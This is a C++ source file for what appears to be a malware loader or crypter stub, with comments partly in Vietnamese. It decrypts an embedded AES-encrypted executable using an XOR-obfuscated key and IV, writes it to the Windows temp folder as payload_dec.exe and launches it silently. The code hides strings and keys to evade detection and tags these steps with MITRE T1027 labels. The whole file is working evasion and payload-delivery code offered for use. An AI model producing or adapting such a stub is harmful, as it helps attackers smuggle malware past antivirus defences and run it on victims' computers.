// stub.cpp
// Compile: x86_64-w64-mingw32-g++ stub.cpp -o stub.exe -lbcrypt -mwindows

#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "bcrypt.lib")

#include "payload_array.h"

// T1027: String obfuscation
char sz_tmp[]  = {'T','E','M','P',0};
char sz_file[] = {'p','a','y','l','o','a','d','_','d','e','c','.','e','x','e',0};

// T1027: Key obfuscation — paste output từ packer.py vào đây
unsigned char raw_key[] = {0xa0, 0x21, 0x4f, 0x48, 0xa8, 0x3f, 0xc6, 0x34, 0xd4, 0xee, 0x65, 0x44, 0x15, 0x3e, 0x6c, 0xb1};
unsigned char raw_iv[]  = {0x86, 0xaf, 0x20, 0x7d, 0x64, 0x2b, 0xf7, 0x75, 0x9b, 0x26, 0xeb, 0x8, 0x53, 0x0, 0xd9, 0x1a};

BOOL aes_decrypt(BYTE* enc, DWORD enc_len, BYTE* key, BYTE* iv,
                 BYTE** out, DWORD* out_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL ret = FALSE;
    DWORD cbResult = 0;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 16, 0)))
        goto done;

    BCryptDecrypt(hKey, enc, enc_len, NULL, iv, 16, NULL, 0, &cbResult, BCRYPT_BLOCK_PADDING);
    *out = (BYTE*)HeapAlloc(GetProcessHeap(), 0, cbResult);
    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, enc, enc_len, NULL, iv, 16,
        *out, cbResult, out_len, BCRYPT_BLOCK_PADDING)))
        goto done;

    ret = TRUE;
done:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ret;
}

int main() {
    // T1027: XOR decode key runtime
    // k = 0x55 ^ 0xFF = 0xAA — không lưu constant rõ ràng
    unsigned char k = 0x55 ^ 0xFF;
    BYTE key[16], iv[16];
    for (int i = 0; i < 16; i++) {
        key[i] = raw_key[i] ^ k;
        iv[i]  = raw_iv[i]  ^ k;
    }

    // payload không còn KEY+IV ở đầu
    BYTE* ciphered     = enc_payload;
    DWORD ciphered_len = enc_payload_len;

    BYTE* pe_data = NULL;
    DWORD pe_size = 0;

    if (!aes_decrypt(ciphered, ciphered_len, key, iv, &pe_data, &pe_size))
        return 1;

    // Ghi ra %TEMP%\payload_dec.exe
    char tmp_dir[MAX_PATH];
    GetEnvironmentVariableA(sz_tmp, tmp_dir, MAX_PATH);

    char out_path[MAX_PATH];
    snprintf(out_path, MAX_PATH, "%s\\%s", tmp_dir, sz_file);

    HANDLE hFile = CreateFileA(out_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written;
    WriteFile(hFile, pe_data, pe_size, &written, NULL);
    CloseHandle(hFile);

    // Chạy payload
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcessA(out_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    HeapFree(GetProcessHeap(), 0, pe_data);
    return 0;
}
